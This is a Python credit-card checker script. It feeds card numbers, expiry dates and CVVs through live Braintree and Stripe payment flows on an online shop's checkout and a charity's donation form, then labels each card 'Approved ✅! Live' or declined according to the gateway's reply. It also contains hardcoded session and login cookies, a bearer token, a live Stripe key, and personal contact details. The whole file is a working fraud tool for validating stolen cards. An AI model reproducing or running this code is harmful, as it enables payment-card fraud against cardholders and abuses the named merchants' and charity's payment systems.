import requests
import re
import random
import time
import string
import base64
from bs4 import BeautifulSoup
import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjgyOTQ3OTIsImp0aSI6IjU5MDgzNGQ2LTRiYzItNGM5MS04NzE0LThiMzVjZDUxNjQxYiIsInN1YiI6Ijh2cXZzbWsyaGJtNDdjNHQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijh2cXZzbWsyaGJtNDdjNHQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.uk5UJeYL8-rmyNRkqmHSwz6nTVAJt42Ed-vldJCp1DiD_LZxcK_RunRhLwIR35CYtG1r3S2B5s_rgPKqQIR4iw',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '92a3f9ce-17fa-4d9a-95d3-1134d7f0f18e',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok=(response.json()['data']['tokenizeCreditCard']['token'])


	cookies = {
    'electron_wishlist_key': 'VFH6QR',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-10-06%2015%3A09%3A09%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.vrtechbay.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-10-06%2015%3A09%3A09%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.vrtechbay.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'tu-geoip-ajax': '%7B%22city%22%3Anull%2C%22state%22%3Anull%2C%22country%22%3A%22Myanmar%22%7D',
    'tu-geoip-hide': 'false',
    'electron_cpv_17988': '10',
    'woocommerce_items_in_cart': '1',
    'woocommerce_cart_hash': '092384ca558c38c4b44d35b509b6f58e',
    'popup_form_dismissed_1': '1',
    'mailpoet_subscriber': '%7B%22subscriber_id%22%3A86%7D',
    'wordpress_logged_in_c63d55e561767d2c9b9b3fd75a120daa': 'ghh.hh%7C1729438996%7CoyRKzPe4p2h9umHyLfSzBp4S956MJ0L5QI3QIjEfcsy%7C25dd8b75c496bb947f22cb7b5fb42fbee03df7bc54e9c9b02078256f2652c42b',
    'wp_woocommerce_session_c63d55e561767d2c9b9b3fd75a120daa': '75%7C%7C1728401987%7C%7C1728398387%7C%7Cbe1e15e7b9b9d5550ab541cdcd70ec17',
    'wfwaf-authcookie-7b3888a38b61caa6a4ba71aa803e0605': '75%7Cother%7Cread%7C5c1adcaab48e3fa8e1edbc9f414e1c03b077921190b74b83516fee18b31046df',
    'sbjs_session': 'pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.vrtechbay.com%2Fcheckout%2F',
    'mailpoet_page_view': '%7B%22timestamp%22%3A1728229562%7D',
}

	headers = {
    'authority': 'www.vrtechbay.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.vrtechbay.com',
    'referer': 'https://www.vrtechbay.com/checkout/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

	params = {
    'wc-ajax': 'checkout',
}

	data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fwww.vrtechbay.com%2Fcart%2F&wc_order_attribution_session_start_time=2024-10-06+15%3A09%3A09&wc_order_attribution_session_pages=5&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Linux%3B+Android+10%3B+K)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F124.0.0.0+Mobile+Safari%2F537.36&billing_first_name=Nge&billing_last_name=Chit&billing_company=Hh&billing_country=US&billing_address_1=New+York+&billing_address_2=Saturday+morning+&billing_city=New+York+&billing_state=NY&billing_postcode=10080&billing_phone=09400691006&billing_email=saimyataungcr8%40gmail.com&shipping_first_name=Ghh&shipping_last_name=Hh&shipping_company=Hh&shipping_country=US&shipping_address_1=Jigg&shipping_address_2=Hgg&shipping_city=Vhh&shipping_state=NY&shipping_postcode=10080&order_comments=&shipping_method%5B0%5D=wf_multi_carrier_shipping%3Aups_UPS+Ground&payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=0&wc-braintree-credit-card-3d-secure-order-total=86.36&wc_braintree_credit_card_payment_nonce={tok}&mailpoet_woocommerce_checkout_optin=1&mailpoet_woocommerce_checkout_optin_present=1&cr_customer_consent=on&cr_customer_consent_field=1&terms=on&terms-field=1&woocommerce-process-checkout-nonce=ceea787b9f&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'

	response = requests.post('https://www.vrtechbay.com/', params=params, cookies=cookies, headers=headers, data=data)

	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if "Insufficient funds in account, please use an alternate card or other form of payment." in text:
			return('Approved ✅')
		elif "CVV." in text:
			return(' cvv ❌')
		elif "The provided card was declined, please use an alternate card or other form of payment." in text:
			return('Card Not Activated')
		elif "The provided card is expired, please use an alternate card or other form of payment." in text:
			return('The Card is Expired')
		elif "The card type is invalid or does not correlate with the credit card number. Please try again or use an alternate card or other form of payment." in text:
			return('Approved ✅! CVV')
		elif "The card verification number does not match. Please re-enter and try again." in text:
			return('Approved ✅! Live')
		elif "We cannot process your order with the payment information that you provided. Please use a different payment account or an alternate payment method." in text:
			return('Declined - Call Issuer')
		else:
			return(' Cvv  ❌')
			
def Tele2(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	with open('fileb3.txt', 'r') as file:
		first_line = file.readline()
	while True:
		lines='''zkbzmssh%7C1722163826%7CPYyJVGful9oiz9Fk2qffCmmrLkPFHj6pjCToHoyt8r1%7Ceb9935d8bc113a5acd9c193064033918787622ca95782d6317955699be2082b0
'hdjshshsh%7C1722164162%7CTP3afdym0X81iDDxRTbRkBWLDdAKgqEKwqx6GYim365%7C424cfcf6eb45d32f11893eb98004603b447a77cee129c990e95867665537d75d
bsbsjdhhdj%7C1722164292%7CAnd5Gmo2UVNQz7IFiuuOHbcWFUoVJBk7DQtsjQS27Oa%7C6e9883df5374751c0cdc9383a751fcb80b31dfacc9e4747bbf08883e4986a7c7
jdhshsh%7C1722164426%7CQkqnUBtPMRYcYpcvKhriZedlcVJsl24RrNRohG9rVRM%7Cbb8a8b162fd95263262ae98ada998ab6063eb46e075d944fda37cffee93b343a
'''
		lines = lines.strip().split('\n')
		random_line_number = random.randint(0, len(lines) - 1)
		big = lines[random_line_number]
		if big == first_line:
			pass
		else:
			break
	with open('fileb3.txt', 'w') as file:
		file.write(big)
	import requests

	headers = {
			'authority': 'api.stripe.com',
			'accept': 'application/json',
			'accept-language': 'en-US,en;q=0.9',
			'content-type': 'application/x-www-form-urlencoded',
			'origin': 'https://js.stripe.com',
			'referer': 'https://js.stripe.com/',
			'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51NJgOXCjU8lO8MWc81K66yGhcm9C0UPHTGgfypyAMPmRU79JIeCDD5mPWBGOU2v8hcYshCsaVmnqNzl50NQEe4p100CxLWdRv1'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']

	import requests

	cookies = {
			'__stripe_mid': 'd995f54d-9538-4878-a87b-12c43a6bbf36ea2fbc',
			'__stripe_sid': '72b76125-964d-40a9-9c86-1b5fa32027eb550fb6',
	}

	headers = {
			'authority': 'golf316.org',
			'accept': '*/*',
			'accept-language': 'en-US,en;q=0.9',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			# 'cookie': '_gcl_au=1.1.1367202926.1717785226; _ga=GA1.1.893384611.1717785226; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; __stripe_mid=3a0199b6-5c49-4a71-902d-5f067e943a8e8b6c91; lp_session_guest=g-6667f5cca6926; twk_idm_key=xdzosJCoUNJs2yO4wkzym; __stripe_sid=7640bd74-93e1-4970-9509-07359c7280685d8ce8; TawkConnectionTime=0; _ga_1MRCZYKWF0=GS1.1.1718151395.11.1.1718151493.0.0.0; _ga_05M43KE6K7=GS1.1.1718151396.27.1.1718151493.0.0.0',
			'origin': 'https://golf316.org',
			'referer': 'https://golf316.org/donations/',
			'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
			'x-requested-with': 'XMLHttpRequest',
	}

	params = {
			't': '1728016959531',
	}

	data = {
			'data': '__fluent_form_embded_post_id=2161&_fluentform_7_fluentformnonce=3309ed33dc&_wp_http_referer=%2Fdonations%2F&names%5Bfirst_name%5D=Sai&names%5Blast_name%5D=Myat&email=saimyataungcr8%40gmail.com&payment_input=Other&custom-payment-amount=3&payment_method=stripe&__entry_intermediate_hash=ceb9d66af62f3c39b9f0b3c405664044&__stripe_payment_method_id='+str(pm)+'',
            'action': 'fluentform_submit',
            'form_id': '7',
	}
	
	r2 = requests.post(
			'https://golf316.org/wp-admin/admin-ajax.php',
			params=params,
			cookies=cookies,
			headers=headers,
			data=data,
	)
	return (r2.json()['errors'])
			
			
		
